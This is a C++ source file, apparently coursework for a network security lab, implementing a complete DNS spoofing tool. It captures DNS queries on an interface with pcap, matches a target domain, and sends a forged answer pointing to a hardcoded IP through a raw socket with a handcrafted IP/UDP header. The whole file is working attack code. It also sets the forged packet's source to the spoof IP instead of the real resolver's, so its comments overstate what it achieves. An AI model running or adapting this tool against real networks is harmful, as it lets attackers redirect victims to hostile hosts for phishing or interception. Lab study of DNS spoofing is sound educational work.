/**
 * MO639 - Network Security
 * lab03 - DNS spoof (C++ version)
 *
 * This program intercepts DNS queries for a specified domain and sends a spoofed response.
 * The spoofing IP is fixed as 192.168.127.132.
 */

 #include <iostream>
 #include <cstring>
 #include <cstdlib>
 #include <cstdio>
 #include <pcap.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <arpa/inet.h>
 #include <string>
 #include <cerrno>
 #include <unistd.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <resolv.h>
 
 #define IP_SIZE 16
 #define REQUEST_SIZE 100
 #define PCAP_INTERFACENAME_SIZE 16
 #define FILTER_SIZE 200
 #define ETHER_ADDR_LEN  6
 #define DATAGRAM_SIZE 8192
 
 // Spoofing parameters (command-line arguments: --interface and --request)
 struct SpoofParams {
     std::string ip;       // Spoofing IP (hardcoded: 192.168.127.132)
     std::string request;  // Requested domain (e.g., www.example.com)
     std::string interface;// Network interface name (e.g., eth0)
 };
 
 // Ethernet header definition
 struct etherhdr {
     u_char ether_dhost[ETHER_ADDR_LEN]; // Destination MAC
     u_char ether_shost[ETHER_ADDR_LEN]; // Source MAC
     u_short ether_type;                 // Protocol type
 };
 
 // DNS header definition
 struct dnshdr {
     char id[2];
     char flags[2];
     char qdcount[2];
     char ancount[2];
     char nscount[2];
     char arcount[2];
 };
 
 // DNS query structure
 struct dnsquery {
     char *qname;
     char qtype[2];
     char qclass[2];
 };
 
 /**
  * Prints a message to the console.
  */
 void print_message(const std::string &request, const std::string &ip) {
     std::cout << "The host " << ip << " made a request to " << request << std::endl;
 }
 
 /**
  * Sends a DNS answer using a raw socket.
  */
 void send_dns_answer(const char* ip, u_int16_t port, char* packet, int packlen) {
     struct sockaddr_in to_addr;
     int bytes_sent;
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     int one = 1;
     const int *val = &one;
 
     if (sock < 0) {
         std::cerr << "Error creating socket" << std::endl;
         return;
     }
     memset(&to_addr, 0, sizeof(to_addr));
     to_addr.sin_family = AF_INET;
     to_addr.sin_port = htons(port);
     to_addr.sin_addr.s_addr = inet_addr(ip);
 
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
         std::cerr << "Error at setsockopt()" << std::endl;
         close(sock);
         return;
     }
 
     bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
     if (bytes_sent < 0)
         std::cerr << "Error sending data" << std::endl;
     close(sock);
 }
 
 /**
  * Calculates a checksum for a given header.
  */
 unsigned short csum(unsigned short *buf, int nwords) {
     unsigned long sum = 0;
     for (; nwords > 0; nwords--)
         sum += *buf++;
     sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     return static_cast<unsigned short>(~sum);
 }
 
 /**
  * Builds an UDP/IP datagram.
  * @param src_ip: IP of the host that sent the DNS request (destination of our response)
  * @param spoofed_ip: spoofed IP (always "192.168.127.132")
  */
 void build_udp_ip_datagram(char* datagram, unsigned int payload_size, const char* src_ip, const char* spoofed_ip, u_int16_t port) {
     struct ip *ip_hdr = reinterpret_cast<struct ip*>(datagram);
     struct udphdr *udp_hdr = reinterpret_cast<struct udphdr*>(datagram + sizeof(struct ip));
 
     ip_hdr->ip_hl = 5;      // Header length
     ip_hdr->ip_v = 4;       // IPv4
     ip_hdr->ip_tos = 0;
     int total_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;
     ip_hdr->ip_len = total_len;  // Temporary host order (for checksum calculation)
     ip_hdr->ip_id = 0;
     ip_hdr->ip_off = 0;
     ip_hdr->ip_ttl = 255;
     ip_hdr->ip_p = IPPROTO_UDP;
     ip_hdr->ip_sum = 0;
     ip_hdr->ip_src.s_addr = inet_addr(spoofed_ip); // Use spoofed IP
     ip_hdr->ip_dst.s_addr = inet_addr(src_ip);
 
     udp_hdr->source = htons(53); // DNS server port
     udp_hdr->dest = htons(port);
     udp_hdr->len = htons(sizeof(struct udphdr) + payload_size);
     udp_hdr->check = 0;
 
     ip_hdr->ip_sum = csum(reinterpret_cast<unsigned short*>(datagram), total_len >> 1);
     ip_hdr->ip_len = htons(total_len);
 }
 
 /**
  * Builds a DNS answer packet.
  */
 unsigned int build_dns_answer(const SpoofParams &spoof_params, const struct dnshdr *dns_hdr, char* answer, const char* request) {
     unsigned int size = 0;
     struct dnsquery *dns_query;
     unsigned char ans[4];
 
     int a, b, c, d;
     sscanf(spoof_params.ip.c_str(), "%d.%d.%d.%d", &a, &b, &c, &d);
     ans[0] = static_cast<unsigned char>(a);
     ans[1] = static_cast<unsigned char>(b);
     ans[2] = static_cast<unsigned char>(c);
     ans[3] = static_cast<unsigned char>(d);
 
     dns_query = reinterpret_cast<struct dnsquery*>(
                   reinterpret_cast<const char*>(dns_hdr) + sizeof(struct dnshdr));
 
     // DNS header section
     memcpy(&answer[0], dns_hdr->id, 2);
     memcpy(&answer[2], "\x81\x80", 2);
     memcpy(&answer[4], "\x00\x01", 2);
     memcpy(&answer[6], "\x00\x01", 2);
     memcpy(&answer[8], "\x00\x00", 2);
     memcpy(&answer[10], "\x00\x00", 2);
 
     // DNS query section
     size = strlen(request) + 2; // qname length (including label lengths and terminating 0)
     memcpy(&answer[12], dns_query, size);
     size += 12;
     memcpy(&answer[size], "\x00\x01", 2); // type A
     size += 2;
     memcpy(&answer[size], "\x00\x01", 2); // class IN
     size += 2;
 
     // DNS answer section
     memcpy(&answer[size], "\xc0\x0c", 2); // pointer to qname
     size += 2;
     memcpy(&answer[size], "\x00\x01", 2); // type A
     size += 2;
     memcpy(&answer[size], "\x00\x01", 2); // class IN
     size += 2;
     memcpy(&answer[size], "\x00\x00\x00\x22", 4); // TTL (34 seconds)
     size += 4;
     memcpy(&answer[size], "\x00\x04", 2); // RDATA length
     size += 2;
     memcpy(&answer[size], ans, 4); // spoofed IP address
     size += 4;
 
     return size;
 }
 
 /**
  * Extracts the DNS request string from the DNS query.
  * Example: [3]www[7]example[3]com[0] → "www.example.com"
  */
 void extract_dns_request(struct dnsquery *dns_query, char *request) {
     unsigned int i, j, k;
     char *curr = dns_query->qname;
     unsigned int size;
 
     size = static_cast<unsigned char>(curr[0]);
     j = 0;
     i = 1;
     while (size > 0) {
         for (k = 0; k < size; k++) {
             request[j++] = curr[i + k];
         }
         request[j++] = '.';
         i += size;
         size = static_cast<unsigned char>(curr[i++]);
     }
     request[--j] = '\0';
 }
 
 /**
  * Extracts the port number from the UDP header.
  */
 void extract_port_from_udphdr(struct udphdr* udp, u_int16_t* port) {
     *port = ntohs(*(u_int16_t*)udp);
 }
 
 /**
  * Converts a raw IP address to a string.
  */
 void extract_ip_from_iphdr(u_int32_t raw_ip, char* ip) {
     int aux[4];
     for (int i = 0; i < 4; i++){
         aux[i] = (raw_ip >> (i * 8)) & 0xff;
     }
     sprintf(ip, "%d.%d.%d.%d", aux[0], aux[1], aux[2], aux[3]);
 }
 
 /**
  * Extracts DNS data (DNS header, query, source/destination IP, port) from a packet.
  */
 void extract_dns_data(const u_char *packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query, char* src_ip, char* dst_ip, u_int16_t *port) {
     struct etherhdr *ether = reinterpret_cast<struct etherhdr*>(const_cast<u_char*>(packet));
     struct iphdr *ip = reinterpret_cast<struct iphdr*>(const_cast<u_char*>(packet + sizeof(struct etherhdr)));
     extract_ip_from_iphdr(ip->saddr, src_ip);
     extract_ip_from_iphdr(ip->daddr, dst_ip);
 
     unsigned int ip_header_size = ip->ihl * 4;
     struct udphdr *udp = reinterpret_cast<struct udphdr*>(const_cast<u_char*>(packet + sizeof(struct etherhdr) + ip_header_size));
     extract_port_from_udphdr(udp, port);
 
     *dns_hdr = reinterpret_cast<struct dnshdr*>(const_cast<u_char*>(packet + sizeof(struct etherhdr) + ip_header_size + sizeof(struct udphdr)));
     dns_query->qname = reinterpret_cast<char*>(*dns_hdr + 1);
 }
 
 /**
  * Packet handler callback function for pcap_loop.
  */
 void handle_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
     SpoofParams *spoof_params = reinterpret_cast<SpoofParams*>(args);
     struct dnsquery dns_query;
     struct dnshdr *dns_hdr;
 
     char request[REQUEST_SIZE];
     char src_ip[IP_SIZE], dst_ip[IP_SIZE];
     u_int16_t port;
 
     char datagram[DATAGRAM_SIZE];
     char* answer;
     unsigned int datagram_size = 0;
 
     memset(datagram, 0, DATAGRAM_SIZE);
     extract_dns_data(packet, &dns_hdr, &dns_query, src_ip, dst_ip, &port);
     extract_dns_request(&dns_query, request);
 
     // If the intercepted request matches the specified domain, send the spoofed response.
     if (strcmp(request, spoof_params->request.c_str()) == 0) {
         answer = datagram + sizeof(struct ip) + sizeof(struct udphdr);
         datagram_size = build_dns_answer(*spoof_params, dns_hdr, answer, request);
         // Build UDP/IP header (src_ip is the requesting host, spoof_params.ip is the spoofed IP)
         build_udp_ip_datagram(datagram, datagram_size, src_ip, spoof_params->ip.c_str(), port);
         datagram_size += (sizeof(struct ip) + sizeof(struct udphdr));
         send_dns_answer(src_ip, port, datagram, datagram_size);
         print_message(spoof_params->request, src_ip);
     }
 }
 
 /**
  * Captures packets using the pcap library and applies a filter.
  */
 void run_filter(SpoofParams &spoof_params) {
     char filter[FILTER_SIZE];
     char errbuf[PCAP_ERRBUF_SIZE];
     struct bpf_program fp;
     pcap_t *handle;
 
     memset(errbuf, 0, PCAP_ERRBUF_SIZE);
     handle = pcap_open_live(spoof_params.interface.c_str(), 1500, 1, 0, errbuf);
     if (handle == nullptr) {
         std::cerr << errbuf << std::endl;
         exit(1);
     }
     if (strlen(errbuf) > 0) {
         std::cerr << "Warning: " << errbuf << std::endl;
         errbuf[0] = '\0';
     }
 
     sprintf(filter, "udp and dst port domain");
 
     if(pcap_compile(handle, &fp, filter, 0, 0) == -1) {
         std::cerr << "Couldn't parse filter " << filter << ": " << pcap_geterr(handle) << std::endl;
         exit(-1);
     }
 
     if (pcap_setfilter(handle, &fp) == -1) {
         std::cerr << "Couldn't install filter " << filter << ": " << pcap_geterr(handle) << std::endl;
         exit(-1);
     }
 
     pcap_loop(handle, -1, handle_packet, reinterpret_cast<u_char*>(&spoof_params));
 
     pcap_freecode(&fp);
     pcap_close(handle);
 }
 
 /**
  * Prints program usage instructions.
  */
 void usage(const char *prog_name) {
     std::cerr << "Usage: " << prog_name << " --interface <interface> --request <request>" << std::endl;
     exit(-1);
 }
 
 /**
  * Parses command-line arguments.
  * Only --interface and --request are used.
  */
 void parse_args(int argc, char *argv[], SpoofParams &spoof_params) {
     if (argc != 5) {
         std::cerr << "Incorrect number of parameters." << std::endl;
         usage(argv[0]);
     }
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--interface") == 0) {
             if (i + 1 < argc) {
                 spoof_params.interface = argv[++i];
             } else {
                 usage(argv[0]);
             }
         } else if (strcmp(argv[i], "--request") == 0) {
             if (i + 1 < argc) {
                 spoof_params.request = argv[++i];
             } else {
                 usage(argv[0]);
             }
         } else {
             usage(argv[0]);
         }
     }
 }
 
 /**
  * Main function.
  * The spoofing IP is always set to "192.168.127.132".
  */
 int main(int argc, char *argv[]) {
     SpoofParams spoof_params;
     parse_args(argc, argv, spoof_params);
     
     // Fix the spoofing IP to "192.168.127.132"
     spoof_params.ip = "192.168.127.132";
     
     run_filter(spoof_params);
     return 0;
 }
 